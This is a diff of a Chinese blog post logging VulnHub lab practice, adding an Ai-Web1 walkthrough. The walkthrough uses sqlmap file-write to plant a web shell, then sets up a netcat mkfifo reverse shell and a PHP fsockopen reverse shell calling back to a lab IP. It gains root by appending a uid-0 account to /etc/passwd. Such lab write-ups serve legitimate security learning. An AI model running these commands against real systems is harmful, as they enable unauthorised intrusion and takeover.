@@ -10,7 +10,7 @@
   <meta name="description" content="JIS-CTF  introduce Penetration testing   Ted:1  introduce Penetration testing   SkyTower  introduce Penetration testing   Ai-Web1  introduce Penetration testing">
 <meta property="og:type" content="article">
 <meta property="og:title" content="vulnhub靶机学习记录">
-<meta property="og:url" content="https://my011215.github.io/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:url" content="https://my011215.github.io/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="blog小窝">
 <meta property="og:description" content="JIS-CTF  introduce Penetration testing   Ted:1  introduce Penetration testing   SkyTower  introduce Penetration testing   Ai-Web1  introduce Penetration testing">
 <meta property="og:locale" content="en_US">
@@ -73,8 +73,23 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/478.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/479.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/480.png?raw=true">
-<meta property="article:published_time" content="2025-03-10T07:30:30.000Z">
-<meta property="article:modified_time" content="2025-03-01T08:06:04.832Z">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/482.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/483.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/484.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/485.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/486.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/487.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/488.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/489.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/490.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/491.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/492.gif?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/493.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/494.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/495.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/496.png?raw=true">
+<meta property="article:published_time" content="2025-03-16T07:30:30.000Z">
+<meta property="article:modified_time" content="2025-03-16T08:18:02.769Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/375.png?raw=true">
@@ -134,8 +149,8 @@
       <div class="outer">
         <section id="main"><article id="post-Penetration testing/vulnhub靶机学习记录" class="article article-type-post" itemscope itemprop="blogPost"> 
 <div class="article-meta">
-    <a href="/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2025-03-10T07:30:30.000Z" itemprop="datePublished">2025-03-10</time>
+    <a href="/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time datetime="2025-03-16T07:30:30.000Z" itemprop="datePublished">2025-03-16</time>
 </a>
 
 
@@ -503,11 +518,61 @@ ogay！可以正常代理登录，尝试查看当前用户的 sudo 命令有什�
  <code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code> <br>
 www-data 网站权限到手<br>
 <img src="https://github.com/my011215/my011215.github.io/blob/main/image/480.png?raw=true" alt></p>
+<ol start="3">
+<li>文件上传</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.21.152/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write D:/test.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/test.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/482.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/483.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/484.png?raw=true" alt></p>
+<ol start="4">
+<li>
+<p>使用蚁剑进行连接<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/485.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/486.png?raw=true" alt></p>
+</li>
+<li>
+<p>反弹 shell<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/487.png?raw=true" alt></p>
+</li>
+</ol>
+<p>-e 参数不可用，只能换一种连接方式<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/488.png?raw=true" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.21.132 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/489.png?raw=true" alt></p>
+<p>成功返回 shell<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/490.png?raw=true" alt></p>
+<p>似乎不是很稳定<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/491.png?raw=true" alt></p>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/492.gif?raw=true" alt></p>
+<ol start="6">
+<li>上传马获取 shell 权限</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传文件的一些小技巧：</span><br><span class="line">1. 通过--file-write写入，再获取oshsell得到网站权限，最后php shell.php</span><br><span class="line">2. 通过python起一个网站服务，获取oshsell得到网站权限后，在os-shell中执行wget命令下载反弹文件，最后php shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock=fsockopen(&quot;192.168.21.132&quot;,6667);</span><br><span class="line">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.21.152/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write D:/shell.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php</span><br></pre></td></tr></table></figure>
+<p>成功回显命令<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/493.png?raw=true" alt></p>
+<p>建立交互式 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>提权<br>
+创建 myhacker 账号</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt my 123456</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;myhacker:$1$myhacker$fET8oFRfWlj8ZLk7eDnkM/:0:0::/root:/bin/bash&#x27;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/494.png?raw=true" alt></p>
+<p>成功拿到 root 权限<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/495.png?raw=true" alt></p>
+<ol start="8">
+<li>获取 flag<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/496.png?raw=true" alt></li>
+</ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://my011215.github.io/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clh8uy1qx0000l4tn74tu6soz" class="article-share-link">Share</a>
+      <a data-url="https://my011215.github.io/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clh8uy1qx0000l4tn74tu6soz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -564,7 +629,7 @@ www-data 网站权限到手<br>
       <ul>
         
           <li>
-            <a href="/2025/03/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
+            <a href="/2025/03/16/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
           </li>
         
           <li>
